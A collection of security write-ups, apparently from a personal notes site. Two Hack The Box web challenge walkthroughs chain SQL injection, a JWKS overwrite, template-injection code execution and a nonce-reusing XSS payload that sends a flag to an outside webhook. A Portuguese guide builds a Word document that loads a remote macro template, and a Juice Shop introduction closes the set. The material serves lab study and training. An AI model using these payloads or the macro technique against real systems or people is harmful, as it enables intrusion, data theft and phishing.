title: Bobby's Bistro
content:
Bobby’s BistroBobby’s Bistro is a medium-level web challenge from Hack The Box.
Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.
Taint AnalisysThe current objective of this fase is to understand the application by identifying its features, their functions, and the endpoints with which it communicates. Caido will be used as a proxy to record the endpoints identified during interaction with the system and to create a sitemap.
Through interaction with the system, the following functionalities were identified: account registration, login, chat with image attachments, and reading announcements; additionally, a route providing JWKS data was found at static/.well-known/jwks.json.
With the source code, it is possible to discover new routes that were not accessed through manual interaction with the system, as well as to examine the implementation of already identified endpoints in search of potential vulnerabilities.
Administrator routes have been identified that can only be accessed with special permissions. In this context, it is also worth examining high-risk features or those that handle critical parts of the system, as a vulnerability in such a component typically carries a more severe impact.
The current phase, therefore, aims to analyze the implementation of the identified functionalities, looking for potential weaknesses and vulnerabilities.
The first method analyzed concerns how the system manages login and sessions, which is handled via these method:
def setup_auth(): kid = secrets.token_hex(16) private_key_jwk = jwk.JWK.generate(kty="RSA", size=2048, alg="RS256", use="sig") private_key_jwk.kid = kid private_jwk_json = private_key_jwk.export_private() public_jwk_json = private_key_jwk.export_public() if not os.path.exists("./keys"): os.mkdir("keys") with open("./keys/private_key.json", mode="w") as file: json.dump(json.loads(private_jwk_json), file) jwks = {"keys": [json.loads(public_jwk_json)]} with open("./static/.well-known/jwks.json", mode="w") as file: json.dump(jwks, file) return kid, private_jwk_json, public_jwk_json def generate_token(claims, kid): headers = {"kid": kid, "alg": "RS256", "typ": "JWT"} with open("./keys/private_key.json") as file: private_key = jwk.JWK.from_json(file.read()) private_pem = private_key.export_to_pem(private_key=True, password=None) token = jwt.encode(claims, private_pem, algorithm="RS256", headers=headers) return token def verify_token(token): try: jwks_path = os.path.abspath("static/.well-known/jwks.json") jwks_client = PyJWKClient(f"file:///{jwks_path.replace(os.sep, '/')}") signing_key = jwks_client.get_signing_key_from_jwt(token) # print(signing_key.algorithm_name) decoded = jwt.decode( token, signing_key.key, algorithms=[signing_key.algorithm_name], options={"verify_signature": True}, ) return decoded except: return FalseIt can be noted that the setup_auth method is responsible for generating the public and private keys used to sign the JWT, as well as for writing the jwks.json file. As for verify_token, although it uses the decode method, which might appear insecure, it actually verifies the token’s signature based on a private key that corresponds to the public key found in jwks.json.
The generate_token method generates a token signed by the private key, containing the claims received via the parameter.
After creating an account in the system and authenticating, we can log in and identify the claims present in the JWT, in this case, only user_id.
File Upload + Arbitrary File WriteThe system includes a file upload feature, which is always a high-risk area.
@app.route("/api/chat-messages", methods=["GET", "POST"]) def chat_messages(): # Return username, nickname, message, timestamp if request.method == "POST": cookie = request.cookies.get("auth_token", "") if not cookie: return jsonify({"error": "unauthorized"}), 401 dictionary = verify_token(cookie) if not dictionary: return jsonify({"error": "unauthorized"}), 401 else: username = User.query.filter_by(id=dictionary["user_id"]).first().username message = request.form.get("message") file = request.files.get("attachment") new_chat_message = ChatMessage( timestamp=str(datetime.now()), content=message, sender=username, attachments=UPLOADS_DIR + "/" + file.filename, ) if file.filename: file.save(UPLOADS_DIR + "/" + file.filename) db.session.add(new_chat_message) db.session.commit() return redirect(url_for("chat_home")) if request.method == "GET": cookie = request.cookies.get("auth_token", "") if not cookie: return jsonify({"error": "unauthorized"}), 401 dictionary = verify_token(cookie) if not dictionary: return jsonify({"error": "unauthorized"}), 401 messages = ChatMessage.query.all() json_array = [] for i in messages: json_array.append([i.timestamp, i.content, i.sender, i.attachments]) return jsonify({"success": True, "messages": json_array}) return {}Focusing on the POST method for this endpoint, it can be observed that the system receives the file from the request and saves its content to {UPLOADS_DIR} + the filename, without any form of validation for either the content or the name. This operation performed by the system serves as a potential sink for exploitation, opening up vectors for path traversal and arbitrary file write.
UPLOADS_DIR = str(BASE_DIR) + "/uploads"In the context of a Flask application, you cannot simply upload a Python-based webshell for the web server to interpret in the same way it might handle a PHP script. However, it is important to keep in mind the possibility of writing arbitrary files to the system’s directories.
JWKS PoisoningWith an arbitrary file write vector, it is possible to replace the data in jwks.json with a file containing parameters under our control; this allows for the forging of a JWT signature, including a token that grants administrative access to the system and entry to privileged routes.
These commands can be used to generate a valid RSA public and private key pair that can be used for token signing:
openssl genrsa -out private_key.pem 2048openssl rsa -in private_key.pem -pubout -out public_key.pemOnce the keys have been created, we need to generate a jwks.json file that uses the public key parameters, enabling the token to be signed with the private key. This can be done using the following script:
import base64, json from cryptography.hazmat.primitives import serialization pub = serialization.load_pem_public_key(open("public_key.pem", "rb").read()) n, e = pub.public_numbers().n, pub.public_numbers().e b64u = lambda i, l: base64.urlsafe_b64encode(i.to_bytes(l, "big")).rstrip(b"=").decode() jwks = { "keys": [{ "kty": "RSA", "use": "sig", "alg": "RS256", "kid": "key-1", "n": b64u(n, (n.bit_length() + 7) // 8), "e": b64u(e, 3), }] } print(json.dumps(jwks, indent=2)) Using the identified arbitrary file write, it is possible to replace the original jwks.json with this modified version.
It has now become possible to sign a token using our private key; the challenge now lies in finding a useful claim, specifically, a valid user ID, since the only one we have access to is that of the user themselves.
SQL InjectionWith the goal of obtaining information regarding other users’ IDs, the candidates for analysis are routes that interact directly with user data, as any vulnerabilities discovered could lead to the leakage of such information.
The current candidates for this phase are the chat-messages and profile routes, as they satisfy the requirement of interacting with user data, given that the chat-message route, when returning message responses, includes the username of the person who posted the message.
The profile route returns the user ID, which makes it an interesting target for attempting to retrieve the admin’s ID.
@app.route("/profile", methods=["GET", "POST"]) @chameleon_flask.template("profile.pt") def profile(): if request.method == "GET": cookie = request.cookies.get("auth_token", "") if not cookie: return redirect(url_for("login")) decoded = verify_token(cookie) if not decoded: return redirect(url_for("login")) uid = decoded["user_id"] user = User.query.filter_by(id=uid).first() if not user: return redirect(url_for("register")) return {"user_data": [], "token": user.token} if request.method == "POST": cookie = request.cookies.get("auth_token", "") if not cookie: return redirect(url_for("login")) decoded = verify_token(cookie) if not decoded: return redirect(url_for("login")) uid = decoded["user_id"] user = User.query.filter_by(id=uid).first() if not user: return redirect(url_for("register")) token = request.form.get("token") user_data = ( db.session.query(User).filter(text("token='{}'".format(token))).all() ) print(user_data) return {"user_data": user_data, "token": user.token}Analyzing the POST method for this route, one can observe the following issue: user_data = (db.session.query(User).filter(text("token='{}'".format(token))).all())
Even though SQLAlchemy is used as an ORM, the system employs a user-controlled parameter to construct the query text, rather than utilizing the ORM’s functions to build the query in a secure manner. Consequently, a sink for SQL injection was identified.
By exploiting this vector, it is possible to exfiltrate the IDs of all users in the database, including the admin’s, using the payload token='OR 1=1 -- -
With this, the claim needed to generate the admin’s self-signed JWT was obtained, making it possible to impersonate the administrative session.
Admin’s sessionUsing the two identified attack vectors, it is possible to:
Obtain the admin ID via SQL injection. Replace the jwks.json file with a modified version containing our own key data. Create a JWT signed with the private key, including the admin ID as a claim, thereby achieving privilege escalation. Steps 1 and 2 have already been completed in previous sessions; to finish step 3, you must first import the data from the generated RSA key:
Replace the user_id from the original token with the administrator’s user_id and sign the token using our key:
With the signed token, it is possible to replace the cookie stored in the browser with this token and assume an administrator session.
With this session, privileged routes become available, specifically the /admin/announcements route, which serves as an interface for interacting with the (privileged) POST method of the /api/announcements route.
SSTI to RCEThe /admin/announcements page contains a form that submits data to the /api/announcements route, which has this handler:
@app.route("/api/announcements", methods=["GET", "POST"]) def announcements(): if request.method == "GET": cookie = request.cookies.get("auth_token", "") if not cookie: return jsonify({"error": "unauthorized"}), 401 dictionary = verify_token(cookie) if not dictionary: return jsonify({"error": "unauthorized"}), 401 user_id = dictionary["user_id"] user = User.query.filter_by(id=user_id).first() if not user: return jsonify({"error": "unauthorized"}), 401 announcements_array = Announcement.query.filter_by( receiver=user.username ).first() if user.username == admin_username: announcements_array = Announcement.query.filter_by(sender=user.username) json_array = [] if announcements_array: for i in announcements_array: json_array.append([i.id, i.timestamp, i.sender, i.receiver]) return jsonify(json_array), 200 if request.method == "POST": cookie = request.cookies.get("auth_token", "") if not cookie: return jsonify({"error": "unauthorized"}), 401 dictionary = verify_token(cookie) if not dictionary: return jsonify({"error": "unauthorized"}), 401 user_id = dictionary["user_id"] user = User.query.filter_by(id=user_id).first() if not user or user.username != admin_username: return jsonify({"error": "unauthorized"}), 401 title = request.form.get("title") content = markdown.markdown(request.form.get("announcement")) if content: for i in '$#{}"_.': content = content.replace(i, "") tpl = PageTemplate(content) res = tpl.render() users = User.query.all() for i in users: new_announcement = Announcement( timestamp=str(datetime.now()), sender=user.username, content=res, title=title, receiver=i.username, ) db.session.add(new_announcement) db.session.commit() return jsonify({"success": True}), 200The most interesting part is that this route reads the value of the announcement parameter and renders a template using that data. This sink allows for the creation of a malicious template that executes Python code, leading to RCE (Remote Code Execution). However, before the template is created, a validation step takes place in which the control characters $#{}"_. are removed.
if content: for i in '$#{}"_.': content = content.replace(i, "") tpl = PageTemplate(content) res = tpl.render()As a result, common payloads like ${7*7} end up not working due to the validation.
By reading the template library documentation, you can identify other ways to write Python code that will be executed: https://mkennedy.codes/docs/chameleon-flask/user-guide/writing-templates.html#content-and-replacement-talcontent-and-talreplace
The tal:content and tal:define tags seem the most interesting for this purpose.
This proves that it is possible to execute Python code. The current issue is that the mro technique for executing arbitrary Python code relies on a syntax that includes . and _ characters, which are flagged during the validation stage for this route.
Here you can see some bypass techniques for character validation in SSTI attacks: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html#filter-bypasses
This article demonstrates the use of Python’s chr function to construct dynamic strings, which can be quite useful for this bypass: https://www.yeswehack.com/fr/learn-bug-bounty/server-side-template-injection-exploitation
import cmd class PayloadGenerator(cmd.Cmd): prompt = "cmd> " def default(self, line): if line.lower() in ['exit', 'quit', 'q']: return True # Converte o texto para a string formatada payload = "+".join([f"chr({ord(c)})" for c in line]) print(f"\n[Payload Gerado]:") print(payload) print("-" * 30 + "\n") if __name__ == '__main__': PayloadGenerator().cmdloop()This Python script converts strings provided via input into sequences of chr calls, serving as a utility to help create payloads using the aforementioned technique.
The problem is that by using this generated chain of chr values, the result is the string 7*7 rather than the execution of the code, since the functions return the strings 7, *, and 7.
However, the solution is simple: place everything inside an eval, which will interpret the string as Python code.
In this context, everything necessary to execute Python code within an eval statement—by leveraging a chr bypass—is already available. The script can be used to generate the code __import__('os').popen('cat /flag*').read() and read the flag.
Exploit ChainThe exploit chain is already established for obtaining the flag:
Retrieve the user_id via SQL Injection; Overwrite jwks.json to enable the forging of a token signature containing the administrator’s user_id; Achieve RCE via SSTI, using an eval + chr bypass. Applying this in production:
Exfiltrating the admin’s user_id.
Overwriting jwks.json Signing a token with the administrator’s user id. Accessing the announcement creation screen. SSTI payload. Reading the flag.

Retrieve the user_id via SQL Injection; Overwrite jwks.json to enable the forging of a token signature containing the administrator’s user_id; Achieve RCE via SSTI, using an eval + chr bypass. Applying this in production:
Exfiltrating the admin’s user_id.
Overwriting jwks.json Signing a token with the administrator’s user id. Accessing the announcement creation screen. SSTI payload. Reading the flag.

title: Nomad Notes
content:
Nomad NotesNomad Notes is a medium-level web challenge from Hack The Box.
Setup test environmentFor the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.
First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.
Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.
Taint AnalisysThe next objective is to map the application’s attack surface, identifying which exposed routes we can interact with and what each one does. This can be done either by interacting with the application and observing the endpoints logged in a proxy, or by reading the source code provided as part of the challenge.
A hybrid approach is advantageous, as the source code allows us to identify the routes the application exposes, which we can then use to dynamically understand how to interact with them.
// routes exported in routes.js const express = require('express'); const router = express.Router(); const controllers = require('../controllers/controllers'); router.get('/', controllers.index); router.get('/postcard', controllers.postcard); router.get('/destinations', controllers.destinations); router.post('/report', controllers.report); module.exports = router;After a few interactions with the app, we have a map of the application’s routes within the proxy.
Taking advantage of the availability of the source code, the objective of the current phase is to understand the implementation of each available endpoint. This will provide insight into the context of each feature, as well as potential sinks that interact with the inputs sent via the endpoints’ parameters, and, consequently, potential attack vectors.
//controller.js const report = (req, res) => { const { path = `http://${HOST}:${PORT}/` } = req.body; const headers = req.headers; if (isLoopback(req.socket.remoteAddress) && isAllowedOrigin(headers.origin) && headers['x-carta-auth-key']) { botVisit(`http://${HOST}:${PORT}/destinations?name=${encodeURIComponent(headers['x-carta-auth-key'])}&flag=${encodeURIComponent(FLAG)}`); } else { botVisit(`http://${HOST}:${PORT}/${path}`); } res.redirect(`/postcard?recipient=${encodeURIComponent('Friend')}&sender=${encodeURIComponent('Carta Team')}&message=${encodeURIComponent('Success! Your card is on its way. Our staff will verify it matches our travel standards. Enjoy the journey!')}&secret=${encodeURIComponent('Your delivery ID is logged in our system.')}`); };The first method analyzed is the handler for the /report endpoint.
This method first checks the origin of the request; it verifies that the request comes from the server itself, that the HTTP origin is validusing the isLoopback and isAllowedOrigin methods, in addition to checking for the presence of the x-carta-auth-key header.
//utils.js function isLoopback(addr) { console.log(addr); console.log(addr === '127.0.0.1' || addr === '::1'); return addr === '127.0.0.1' || addr === '::1'; }//controller.js const isAllowedOrigin = (origin) => { try { return new URL(origin).origin === APP_ORIGIN; } catch { return false; } };If the conditions are met, the botVisit method opens a Chrome browser and navigates to the /destinations route, passing the x-carta-auth-key header as the value for a name parameter, while also including the flag value as an additional parameter in the query string.
If the conditions do not match, the botVisit method directs the browser to an arbitrary endpoint, which is passed via the path query string parameter of the /report endpoint.
//bot.js async function botVisit(url) { console.log(`[BOT] Visiting: ${url}`); const browser = await puppeteer.launch({ headless: true, executablePath: execPath, args: [ '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu', ], }); try { const page = await browser.newPage(); await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 8000 }); await sleep(4000); console.log('[BOT] Visit complete.'); } catch (err) { console.error(`[BOT] Error visiting ${url}:`, err.message); } finally { await browser.close(); } }This indicates that a client-side attack is required to get the bot to access the /destinations route, with the flag included in the query string, along with a way to read that query string and extract the flag’s value.
However, it is important to note that the application employs strict CORS policies, including the requirement for a nonce to ensure that only valid scripts are executed, which makes XSS attacks significantly more difficult.
//app.js app.use((req, res, next) => { const nonce = generateNonce(24); res.setHeader("Content-Security-Policy", `default-src 'none'; connect-src 'self'; script-src 'nonce-${nonce}'; style-src 'self'; img-src 'self'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; require-trusted-types-for 'script';`); res.locals.nonce = nonce; next(); });Examining the handler for the /postcard route, it can be noted that the route parameters are passed through a function that sanitizes HTML characters, then inserted into an HTML template and subsequently rendered.
//controller.js const postcard = (req, res) => { const { recipient = 'Traveler', sender = 'Carta Staff', message = 'Exploring the world, one card at a time.', secret = 'P.S. I left the key under the mat.' } = req.query; const date = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }); const data = { nonce: res.locals.nonce, date, recipient: escape(recipient), sender: escape(sender), message: escape(message), secret: escape(secret) }; const template = fs.readFileSync(path.join(VIEWS_DIR, 'postcard.html'), 'utf-8'); res.send(renderTemplate(template, data)); };//utils.js function escape(str) { return str.replace(/&/g, "&").replace(/</g, "<").replace(/>/g, ">").replace(/"/g, """).replace(/'/g, "'"); } function renderTemplate(template, data) { for (const key in data) { const value = data[key]; const lines = template.split('\n').map(line => { if (line.includes(`{{ ${key} }}`)) { return line.replace(`{{ ${key} }}`, value); } return line; }); template = lines.join('\n'); } return template; }As a result, simple XSS payloads are encoded and are not interpreted by the browser.
Analyzing the handler for /destinations, it is evident that the name parameter is inserted into the HTML without any sanitization, making it an easy vector for XSS.
//controller.js const destinations = (req, res) => { const { name = 'Explorer' } = req.query; const data = { name }; const template = fs.readFileSync(path.join(VIEWS_DIR, 'destinations.html'), 'utf-8'); res.send(renderTemplate(template, data)); };However, the CORS-related restriction imposed by the application prevents the execution of JavaScript not authorized by the nonce.
Through this analysis, it was possible to identify a bot that accesses a path controlled by the attacker (within the application’s domain) using Chrome, as well as XSS vectors that were blocked by both sanitization and CSP directives.
replace sinkWhile analyzing other functions that interact with external parameters, it was identified that within renderTemplate, the replace function consumes parameters passed via the query string without any form of value validation or control, representing a potential sink for us to exploit.
By reading the documentation for the include function, one can identify the possibility of using control characters that alter the function’s behavior, thereby creating an opening for a potential injection attack, given that these characters are not modified by the escape function.
By conducting small tests with each of these potential values, an interesting behavior was identified for the value $`: the entire line preceding the match is repeated before the replacement value, as in this example:
"hello".replace("ell", "$`") // result -> "hho" This creates an opportunity to copy the nonce value into our script, thereby generating a valid script tag that satisfies the application’s CORS policy and allows for the execution of JavaScript.
<!-- postcard.html --> <script nonce={{ nonce }}>let secret = "{{ secret }}";</script> By injecting a control character, and given the behavior of copying the entire line up to the replacement value, it becomes possible to write an arbitrary value inside a script tag that contains a nonce valid under CORS.
This allows for the injection of JavaScript code to be executed, bypassing both CORS restrictions and the characters otherwise escaped by the escape function, thereby enabling an XSS vector. We were able to execute an alert function to confirm the discovered primitive.
With this vulnerability, it is possible to send the bot to a page containing our XSS payload and control the browser to perform a fetch request to /report. This satisfies the origin requirements, causing the browser to access the /destinations route with the flag included in the query string. However, a second issue must be addressed: how to retrieve the value of the flag without requiring a new XSS injection on the /destinations page.
For this page, there is no script with a valid nonce that we could copy via the include sink. Consequently, CORS will block any XSS attempt.
One weakness of this route is the absence of the escape method; while XSS is not a viable vector here, the injection of HTML code is still possible.
In this article, we can find techniques for extracting user information using only HTML tags, without the need for JavaScript, which fits perfectly with the remaining problem: https://hacktricks.alquymia.com.br/pentesting-web/dangling-markup-html-scriptless-injection/index.html
Therefore, it is possible to inject a meta tag into the destinations page, which will cause the browser to be redirected to the URL specified in the content attribute, while also sending the URL of the destinations page as the referrer, as shown in the example below:
So, the final attack plan is:
Leverage the include sink to achieve a valid XSS, forcing the bot’s browser to access the /reports route from a local origin; this, in turn, triggers a request to the /destinations route with the flag included in the query string. Send an HTML tag designed for data exfiltration via the x-carta-auth-key header; this tag will be injected into the /destinations page through the name parameter, ultimately exfiltrating the data to a webhook under control. ExploitationThe final payload to execute this plan is this value for the POST /report route:
path=postcard%3Frecipient%3DPortas%26sender%3DPentest%26message%3D%253Cimg%2520src%3Dx%253E%26secret%3D%24`%3Bfetch(`%2Freport`%2C%7Bmethod%3A`POST`%2Cheaders%3A%7B%5B`content-type`%5D%3A`application%2Fx-www-form-urlencoded`%2C%5B`x-carta-auth-key`%5D%3Aatob(`PjxtZXRhIG5hbWU9InJlZmVycmVyIiBjb250ZW50PSJ1bnNhZmUtdXJsIj48bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO3VybD1odHRwOi8vd2ViaG9vay5zaXRlLzk3NDQwODNiLWFiZGYtNDRjZC1iMWFiLTY4OTliMzhlMWQyYi8iPg%3D%3D`)%7D%2Cbody%3A`path%3D%2F`%7D)%3B%2F%2F Now, simply apply the exploit in the production environment and obtain the actual flag.

title: Remote Template Injection
content:
Remote Template InjectionA técica de Remote Template Injection permite a execução de macros em arquivos .docx sem que a macro seja carregada e enviada junto ao arquivo. Ao invés disso, o documento aberto baixa um template específico que contém a macro que queremos que seja executado.
A criação do documento malicioso acontece dessa forma:
Criação de um arquivo .dotm com a macro para ser executada e hospede em um servidor; Crie um arquivo .docx qualquer; Renomeie o arquivo de .docx para .zip, e extraia o arquivo .zip ; Edite o parâmetro Target em ./world/_rels/settins.xml.rels e coloque o endereço onde se encontra o template com a macro; Compacte todos os arquivos para um .zip novamente (todos os arquivos, não a pasta raiz) e renomeie para .docx novamente Exemplo PráticoCriação do templateCrie um documento word comum:
Vá em Exibir > Macros > Exibir Macros, ou aperte Alt + F8 para abrir o editor de macros:
Importante a configuração ser de Macros em apenas esse documento:
De um nome qualquer a sua macro e clique em criar, onde seremos enviados para o editor da macro.
Para testar se a macro irá funcionar, a primeira payload pode ser algo simples, como abrir uma calculadora ou notepad, com um código dessa forma:
Set objShell = CreateObject("Wscript.Shell") objShell.Run "calc"Podemos criar duas funções com que farão que nossa macro seja executada assim que o arquivo for aberto, sendo essas funções Document_Open() e AutoOpen(), nossa macro final ficaria parecida com isso:
Podemos clicar no botão de play ou apertar F5 para testar nossa macro, se a calculadora abrir, é por que está funcionando: Agora podemos salvar o arquivo em uma pasta de sua preferência, com a extensão .dotm:
Agora equipados com o template, vamos hospedar em um webserver.
Servindo o templateVárias maneiras podem ser utilizadas para disponibilizar esse template para download, como Ngrok, um servidor dedicado, uma VPS e etc. No caso desse laboratório, estou utilizando o servidor HTTP do python na minha máquina Linux para servir o arquivo que está na mesma rede do Windows. Envie seu template para seu servidor e o deixe disponível:
Com isso, o template está pronto para ser baixado, vamos criar o arquivo docx.
Criação do arquivo docxPara isso, crie um documento word escolhendo um template qualquer, nesse exemplo, escolhi o currículo, em cenários reais é importante editar o documento para ser convincente o suficiente, no laboratório isso não importa tanto.
E somente isso, já podemos salvar o arquivo como arquivo .docx para continuar com as outras etapas. Mude o arquivo de .docx para .zip e descompacte:
Entre na pasta ./word/_rels e edite o arquivo settings.xml.rels, nele, procure pelo parâmetro Target e coloque o endereço do servidor que está hospedando seu template malicioso:
Agora só salvar esse arquivo e zipar todos os arquivos dentro da raiz novamente:
Renomeie o .zip para .docx e teremos um arquivo Word válido que carregará nossa macro.
Executando a prova de conceitoChegou a hora de testar nosso projeto, comece abrindo o documento, isso deverá baixar nosso template no servidor linux:
O documento foi aberto com um aviso de macro a ser executada, e se olharmos no nosso servidor linux, poderemos ver os logs do download do template:
Confirmamos então que essa etapa funcionou, vamos permitir a macro e conferir se a calculadora será aberta:
E nossa macro funcionou! A prova de conceito funcionou, então podemos evoluir.

title: Readme
content:
Juice ShopO OWASP Juice Shop é uma aplicação web desenvolvido pela Open Web Application Security Project (OWASP), onde contém uma série de vulnerabilidades críticas que ocorrem em aplicações web, como uma forma de fornecer um ambiente moderno para praticar e treinar habilidades de hacking.
A aplicação é desenvolvida em Node.js (Express) e Angular, e contém um dashboard com cards para cada vulnerabilidade existente no sistema, em forma de desafios.
Os desafios são separados por módulos, agrupados por categorias de vulnerabilidades, e para escrever meu processo de resolução dos desafios, escrevei uma página por módulo para facilitar a busca e ter uma melhor separação.
Nessa seção, mostrarei como foi para achar o dashboard e como ele se é.
Iniciei minha aplicação usando docker-container, que pode ser feito seguindo a seguinte documentação: https://hub.docker.com/r/bkimminich/juice-shop na parte de Docker container.
Quando entramos na aplicação, vamos para a homepage:
O primeiro desafio apresentado pelo Juice Shop (assim que entramos a primeira vez) é encontrar o scoreboard das vulnerabilidades, podemos fazer isso de duas formas:
Fuzzing Procurar dentro do código fonte (HTML, Javascript e etc…) Com a ajuda de uma proxy, consigo fazer uma busca por todos os dados trafegados entre o client e o server, inclusive javascript e HTML:
Entrando nesse arquivo, conseguimos achar a URL /#/score-board:
Nesse scoreboard, temos um card para cada vulnerabilidade e para desafios de exploração de cada um, que pode é dividido em módulos, além disso, um aviso que que 16 desafios não estão disponíveis na versão do docker (então não farei esses desafios no momento)
A resolução de cada módulo estarão nas páginas a seguir.
